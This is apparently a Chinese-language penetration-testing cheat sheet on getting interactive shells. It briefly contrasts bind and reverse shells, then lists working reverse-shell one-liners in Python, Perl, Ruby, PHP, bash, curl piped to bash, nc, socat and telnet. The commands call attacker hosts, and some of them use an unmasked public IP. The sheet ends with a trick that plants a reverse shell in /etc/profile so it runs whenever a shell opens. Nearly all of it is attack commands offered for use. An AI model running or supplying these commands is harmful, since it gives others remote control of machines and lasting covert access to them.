

### 介绍

> 利用各种方式达成交互式shell的目的。

* 正向shell

  攻击者连接目标机器
  目标开启端口等待连接，攻击者去连接。
  （目标位于公网才行，绕过防火墙出栈策略）

* 反向shell

  攻击者监听本地端口，目标自己把shell给到攻击者。
  (目标可位于内网，可用于绕过入栈策略)

### python

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
```

### perl

```perl
perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Ruby

```ruby
ruby -rsocket -e 'c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```



### php

```shell
php -r '$sock=fsockopen("192.168.37.131",1234);     exec("/bin/sh -i <&3 >&3 2>&3");'
```



### bash

```bash
bash -i >& /dev/tcp/192.168.63.1/8080 0>&1

# -i 选项让 Bash 以 交互式模式 运行
# /dev/tcp/192.168.63.1/8080是 Linux 内置的 TCP 设备文件，用于直接连接到 192.168.63.1:8080
# >& 将 Bash 的 标准输入（stdin）、标准输出（stdout） 和 错误输出（stderr） 重定向 到这个 TCP 连接，相当于创建了一个远程 Shell。
# 0>&1 表示：把 标准输入（0） 重定向到 标准输出（1），确保攻击者的终端可以正常输入命令。
```

### curl

在攻击机主机vps的web目录添加index: 并监听2333端口

```bash
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
```

目标机：

```
curl ip | bash
```



### nc

```shell
nc ip port -e /bin/bash
```



### msfvenom

> 利用metasploit框架的msfenom来写payload。

### Socat

> socat （socket cat）
> 基于socket 与netcat类似

```shell
socat tcp-connect:47.xxx.xxx.72:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane
```



### telnet

> TELecommunication network 是一个远程登录协议和工具
> 基于tcp。端口23

* 目标：

```shell
mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a
```

```cmd
telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000
#在2333端口执行，4000回显
```



### 写入/et/profile

> 当打开shell时，会自动执行profile里的配置和命令。
>
> ```shell
> /bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &
> ```

